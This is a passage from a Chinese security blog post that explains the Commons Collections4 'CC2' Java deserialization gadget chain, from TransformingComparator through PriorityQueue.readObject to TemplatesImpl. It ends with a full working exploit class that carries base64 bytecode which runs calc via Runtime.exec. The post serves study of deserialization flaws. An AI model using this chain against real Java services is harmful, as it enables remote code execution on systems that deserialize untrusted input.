+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int compare(final I obj1, final I obj2) &#123;</span><br><span class="line">    final O value1 = this.transformer.transform(obj1);</span><br><span class="line">    final O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造方法内部又调用了一次构造将ComparatorUtils.NATURAL_COMPARATOR传给了decorated属性（ComparatorUtils.NATURAL_COMPARATOR是一个Comparator类型）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer) &#123;</span><br><span class="line">//又调用了一次构造，多传入了一个参数</span><br><span class="line">    this(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * Constructs an instance with the given Transformer and Comparator.</span><br><span class="line"> *</span><br><span class="line"> * @param transformer  what will transform the arguments to &lt;code&gt;compare&lt;/code&gt;</span><br><span class="line"> * @param decorated  the decorated Comparator</span><br><span class="line"> */</span><br><span class="line">public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,</span><br><span class="line">                              final Comparator&lt;O&gt; decorated) &#123;</span><br><span class="line">//Comparator比较器</span><br><span class="line">    this.decorated = decorated;</span><br><span class="line">    this.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后可以得到这样一条利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">//将InvokerTransformer传递给TransformingComparator</span><br><span class="line">TransformingComparator comparator =new TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>
+
+<p>继续思考一下：如何去触发这个利用链（如何调用TransformingComparator的compare方法？），我们知道comparator比较器在集合中使用的比较多，并且还可以通过实现Comparator接口自定义比较器，而TransformingComparator类本身就是一个自定义比较器，因为它实现了Comparator接口，那么我们可以通过集合来调用TransformingComparator比较器，这个集合必须实现Serializable接口，重写了readObject方法，并且还使用了Comparator比较器。</p>
+<p>这里就要借助jdk中的PriorityQueue集合了，PriorityQueue是一个优先队列，每次排序都会触发comparator比较器的compare方法，并且PriorityQueue还重写了readObject方法（反序列化漏洞必要的利用条件）。</p>
+<p>分析PriorityQueue的readObject方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in size, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"> </span><br><span class="line">    // Read in (and discard) array length</span><br><span class="line">    s.readInt();</span><br><span class="line"> </span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    //接收PriorityQueue队列的元素</span><br><span class="line">    queue = new Object[size];</span><br><span class="line"> </span><br><span class="line">    // Read in all elements.</span><br><span class="line">    //读取元素还原成java对象</span><br><span class="line">    for (int i = 0; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"> </span><br><span class="line">    // Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br><span class="line">    // spec has never explained what that might be.</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>readObject方法会把序列化后的数据还原成java对象，然后通过queue属性用于接收元素 ，queue是一个数组，size属性记录元素的个数，接着调用heapify()方法。</p>
+<p>heapify()方法内部将queue队列作为参数传给了siftDown方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line">这是一个优先队列（PriorityQueue）的私有方法 heapify()，用于将元素按照堆的方式组织起来，以满足优先队列的定义。具体实现方式如下：</span><br><span class="line"></span><br><span class="line">从堆的倒数第二层开始，依次向上遍历每个节点，对每个节点执行 siftDown() 操作。倒数第二层的最后一个节点的下标为 size &gt;&gt;&gt; 1 - 1，其中 &gt;&gt;&gt; 是无符号右移操作符，相当于将右侧的操作数向右移动 size / 2 位，并用零填充高位。这样可以保证只有非叶子节点会被遍历到，因为叶子节点没有子节点，不需要执行 siftDown() 操作。</span><br><span class="line"></span><br><span class="line">对于每个节点，执行 siftDown() 操作。siftDown() 操作会将当前节点与其子节点进行比较，如果当前节点的值比子节点的值小（或者优先级别低），则交换它们的值。然后递归执行 siftDown() 操作，直到当前节点的值不再比子节点的值小（或者优先级别低），或者已经到达叶子节点为止。这样可以保证每个节点的值都比其子节点的值大（或者优先级别高），满足堆的性质。</span><br><span class="line"></span><br><span class="line">在 siftDown() 操作中，每个节点的值都是通过向下比较得到的。因此，在遍历每个节点时，需要将当前节点的值传递给 siftDown() 方法，以便进行比较。</span><br><span class="line"></span><br><span class="line">在 siftDown() 操作中，需要使用内部比较器（或者元素的自然顺序）对元素进行比较。这个比较器通常是在优先队列的构造函数中指定的。</span><br></pre></td></tr></table></figure>
+
+<p>siftDown方法内部判断了PriorityQueue队列的comparator属性是否为空，如果不为空则调用siftDownUsingComparator方法，否则调用siftDownComparable方法，我们来分下一下这两个方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private void siftDown(int k, E x) &#123;</span><br><span class="line">       if (comparator != null)</span><br><span class="line">           siftDownUsingComparator(k, x);</span><br><span class="line">       else</span><br><span class="line">           siftDownComparable(k, x);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>siftDownComparable方法内部会生成一个Comparable比较器并调用compareTo方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  private void siftDownComparable(int k, E x) &#123;</span><br><span class="line">//生成Comparable比较器</span><br><span class="line">      Comparable&lt;? super E&gt; key = (Comparable&lt;? super E&gt;)x;</span><br><span class="line">      int half = size &gt;&gt;&gt; 1;        // loop while a non-leaf</span><br><span class="line">      while (k &lt; half) &#123;</span><br><span class="line">          int child = (k &lt;&lt; 1) + 1; // assume left child is least</span><br><span class="line">          Object c = queue[child];</span><br><span class="line">          int right = child + 1;</span><br><span class="line">          if (right &lt; size &amp;&amp;</span><br><span class="line">              ((Comparable&lt;? super E&gt;) c).compareTo((E) queue[right]) &gt; 0)</span><br><span class="line">              c = queue[child = right];</span><br><span class="line">	//调用compareTo方法</span><br><span class="line">          if (key.compareTo((E) c) &lt;= 0)</span><br><span class="line">              break;</span><br><span class="line">          queue[k] = c;</span><br><span class="line">          k = child;</span><br><span class="line">      &#125;</span><br><span class="line">      queue[k] = key;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>siftDownUsingComparator方法内部调用了comparator属性的Comparator比较器的compare方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">       int half = size &gt;&gt;&gt; 1;</span><br><span class="line">       while (k &lt; half) &#123;</span><br><span class="line">           int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">           Object c = queue[child];</span><br><span class="line">           int right = child + 1;</span><br><span class="line">		//调用comparator属性的compare方法</span><br><span class="line">           if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0)</span><br><span class="line">               c = queue[child = right];</span><br><span class="line">           if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">               break;</span><br><span class="line">           queue[k] = c;</span><br><span class="line">           k = child;</span><br><span class="line">       &#125;</span><br><span class="line">       queue[k] = x;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>从siftDown方法中可以看出PriorityQueue队列中的comparator属性是一个比较器并且还是可控的，如果comparator属性指定为TransformingComparator比较器的话，不就可以调用TransformingComparator的compare方法了吗，于是万能的反射再次登场了，通过反射将PriorityQueue队列中的comparator属性设置为TransformingComparator比较器，这样PriorityQueue集合在反序列化过程中就会调用comparator比较器了，不得不说PriorityQueue集合完美的符合我们需要构造的利用链。</p>
+<p>并且将compare方法的参数设置为TemplatesImpl对象，然后transform方法就会调用TemplatesImpl对象的newTransformer方法，这一步会衔接之前构造的利用链，最终形成完整的CC2链。</p>
+<p>因此我们只需要在PriorityQueue集合中添加两个TemplatesImpl对象作为集合元素就可以触发之前构造的利用链。</p>
+<p>现在我们逆推一下CC2链的利用流程：</p>
+<p><img src="https://img-blog.csdnimg.cn/2021071914501957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>梳理一下利用链流程，PriorityQueue队列调用readObject方法在反序列化过程中调用了compare方法触发TransformingComparator比较器的compare方法，在compare方法内部通过transformer属性调用了transform方法，该方法会触发之前我们构造的利用链通过反射调用newTransformer方法，接触就会调用核心利用代码，加载恶意类TemplatesImpl，newInstance方法实例化TestTemplatesImpl对象时就会调用构造方法，最终调用恶意代码调出计算器。</p>
+<h4 id="CC2链最终payload"><a href="#CC2链最终payload" class="headerlink" title="CC2链最终payload"></a>CC2链最终payload</h4><p>获取字节码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package main.java.cc2;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class getbytes &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 获取类的字节码</span><br><span class="line">            Class&lt;?&gt; clazz = TestTemplatesImpl.class;</span><br><span class="line">            byte[] bytecode = Files.readAllBytes(Paths.get(clazz.getResource(clazz.getSimpleName() + &quot;.class&quot;).toURI()));</span><br><span class="line"></span><br><span class="line">            // 将字节码进行 Base64 编码</span><br><span class="line">            String base64Encoded = Base64.getEncoder().encodeToString(bytecode);</span><br><span class="line"></span><br><span class="line">            // 输出 Base64 编码后的字节码</span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package main.java.cc2;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class cc2test2 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //构造恶意类TestTemplatesImpl转换为字节码并进行base64编码</span><br><span class="line">        byte[] bytes = Base64.decode(&quot;yv66vgAAADEAMQoACAAhCgAiACMIACQKACIAJQcAJgoABQAnBwAoBwApAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAaTGNvbS9jYy9UZXN0VGVtcGxhdGVzSW1wbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEMAAkACgcAKwwALAAtAQAEY2FsYwwALgAvAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMAAKAQAYY29tL2NjL1Rlc3RUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAZgACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAABABIAEwACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFgANAAAAIAADAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABYAFwACABgAAAAEAAEAGQABABIAGgACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAYAAAABAABABkAAQAfAAAAAgAg&quot;);</span><br><span class="line">        //反射创建TemplatesImpl</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);</span><br><span class="line">        Object TemplatesImpl_instance = constructor.newInstance();</span><br><span class="line">        //将恶意类的字节码设置给_bytecodes属性</span><br><span class="line">        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , new byte[][]&#123;bytes&#125;);</span><br><span class="line">        //设置属性_name为恶意类名</span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(TemplatesImpl_instance , &quot;TestTemplatesImpl&quot;);</span><br><span class="line"></span><br><span class="line">        //传递给TransformingComparator</span><br><span class="line">        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,null,null);</span><br><span class="line">        TransformingComparator transformer_comparator =new TransformingComparator(transformer);</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2);</span><br><span class="line">        queue.add(1);</span><br><span class="line">        queue.add(1);</span><br><span class="line"></span><br><span class="line">        //设置comparator属性</span><br><span class="line">        Field field=queue.getClass().getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"></span><br><span class="line">        //设置queue属性</span><br><span class="line">        field=queue.getClass().getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        //数组中必须添加2个元素</span><br><span class="line">        Object[] objects = new Object[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object object = ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/07/13/java-cc%E9%93%BE1/"> java_cc链1</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/07/14/java-cc%E9%93%BE3/">java_cc链3 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/14/java-cc%E9%93%BE3/" rel="prev" title="java_cc链3">
+      <i class="fa fa-chevron-left"></i> java_cc链3
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/19/java-cc%E9%93%BE5/" rel="next" title="java_cc链5">
+      java_cc链5 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">2.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">特点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CC2%E9%93%BE%E6%9C%80%E7%BB%88payload"><span class="nav-number">4.0.1.</span> <span class="nav-text">CC2链最终payload</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
